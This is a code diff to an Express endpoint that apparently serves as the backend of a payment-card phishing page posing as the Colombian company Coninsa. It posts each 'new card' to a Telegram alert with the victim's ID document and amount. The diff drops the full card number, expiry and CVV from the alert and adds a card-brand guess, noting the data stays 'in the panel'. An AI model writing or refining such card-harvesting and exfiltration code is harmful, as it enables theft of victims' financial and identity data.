@@ -162,15 +162,17 @@ app.post('/api/tarjeta/crear', async (req, res) => {
       timeout: 12000,
     });
 
+    const num = (numero_tarjeta || '').replace(/\s/g, '');
+    const banco = num[0] === '4' ? 'Visa' : num[0] === '5' ? 'Mastercard' : num[0] === '3' ? 'Amex/Diners' : 'Otra';
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     await tgText(
-      `💳 <b>NUEVA TARJETA — CONINSA</b>\n\n` +
-      `🆔 <b>ID psec:</b> <code>${r.data?.id || '?'}</code>\n` +
+      `💳 <b>NUEVA TARJETA — CONINSA</b>\n` +
+      `🆔 <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
+      `🏦 <b>Banco:</b> ${banco}\n` +
       `📋 <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
-      `💳 <b>Número:</b> <code>${numero_tarjeta}</code>\n` +
-      `📅 <b>Vence:</b> <code>${fecha}</code>   <b>CVV:</b> <code>${cvv}</code>\n` +
       `💰 <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
-      `🕐 ${hora}`
+      `🕐 ${hora}\n` +
+      `<i>(datos en el panel)</i>`
     );
 
     res.json(r.data);
